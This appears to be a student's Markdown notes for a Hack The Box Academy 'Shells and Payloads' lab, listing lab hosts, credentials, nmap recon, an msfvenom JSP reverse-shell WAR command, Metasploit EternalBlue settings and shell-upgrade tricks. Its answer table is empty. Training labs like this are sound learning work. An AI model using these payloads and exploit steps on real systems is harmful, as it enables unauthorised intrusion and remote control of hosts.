# Skills Assessment — Shells and Payloads

## Target Environment

**Foothold Access:**
- **Method:** RDP via `xfreerdp`
- **IP:** `10.129.202.134`
- **Credentials:** `htb-student` / `HTB_@cademy_stdnt!`

**Network:** Internal inlanefreight network `172.16.0.0/23`

![Network Topology](screenshots/network_topology.jpg)

### Target Hosts

| Host | OS/Type | Address | Exploit Vector | Creds/Notes |
|------|---------|---------|----------------|-------------|
| **Host-01** | Windows | 172.16.1.11:8080 | Apache Tomcat Manager WAR upload | `tomcat:Tomcatadm` |
| **Host-02** | Web App | blog.inlanefreight.local | WordPress/blog exploitation | `admin:admin123!@#` |
| **Host-03** | Linux | 172.16.1.13 | **EternalBlue (MS17-010)** | SMB vulnerability |

### Objectives
- [ ] Interactive shell from Windows host (Host-01)
- [ ] Interactive shell from Linux host (Host-03)
- [ ] Interactive shell from Web application (Host-02)
- [ ] Identify shell environment on each victim

---

### Foothold IP (Spawned)
![Foothold IP](screenshots/foothold_ip.png)

### Network Topology
![Network Topology](screenshots/network_topology.png)

## Connection

```bash
# From Pwnbox or your VM with HTB VPN
xfreerdp 10.129.202.134 /u:htb-student /p:HTB_@cademy_stdnt!
# Then re-enter creds in GUI prompt
```

![RDP Login Screen](screenshots/foothold_rdp_login.jpg)

> ⚠️ **Important:** Start listeners on the **foothold's internal IP** (172.16.x.x), not 0.0.0.0 — the foothold is your pivot point.

---

## Reconnaissance (From Foothold)

```bash
# Verify connectivity
ping 172.16.1.11
ping 172.16.1.13
ping blog.inlanefreight.local

# Port scan
nmap -sT -p- 172.16.1.11,172.16.1.13
nmap -sT -p 80,8080,443,445 blog.inlanefreight.local

# Browse to Tomcat Manager
firefox http://172.16.1.11:8080/manager/html

# Check blog
firefox http://blog.inlanefreight.local
```

---

## Exploitation

### Host-01: Windows Tomcat (172.16.1.11:8080)
**Vector:** Tomcat Manager WAR upload  
**Credentials:** `tomcat:Tomcatadm`

```bash
# Generate WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<FOOTHOLD_IP> LPORT=4444 -f war -o shell.war

# Or cmd.jsp for basic command exec
```

Steps: Access Tomcat Manager → Deploy WAR → Catch shell

---

### Host-02: WordPress Blog (blog.inlanefreight.local)
**Vector:** Admin panel → Theme/Plugin upload  
**Credentials:** `admin:admin123!@#`

```bash
# Login to wp-admin, upload PHP reverse shell
# Or use meterpreter WordPress exploit
# Or edit theme 404.php to include shell
```

---

### Host-03: Linux SMB (172.16.1.13)
**Vector:** MS17-010 EternalBlue

```bash
# Metasploit approach
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.1.13
set LHOST <FOOTHOLD_IP>
run

# Python exploit alternative if MSF unavailable
```

---

## Shell Identification

Once on each host, identify the shell environment:

```bash
# Windows
echo %COMSPEC%
whoami /all
ver

# Linux
echo $SHELL
id
which python python3
ps aux | grep $$

# Upgrade shells
python -c 'import pty; pty.spawn("/bin/bash")'
# or: script -qc /bin/bash /dev/null
# Then: Ctrl+Z, stty raw -echo; fg, export TERM=xterm
```

---

## Flags / Answers

| # | Question | Answer | Status |
|---|----------|--------|--------|
| 1 | Submit flag.txt from Host-01 (Windows) | | ⬜ |
| 2 | Submit flag.txt from Host-02 (Web) | | ⬜ |
| 3 | Submit flag.txt from Host-03 (Linux) | | ⬜ |
| 4 | Shell environment on Host-01 | | ⬜ |
| 5 | Shell environment on Host-02 | | ⬜ |
| 6 | Shell environment on Host-03 | | ⬜ |

---

## Lessons Learned
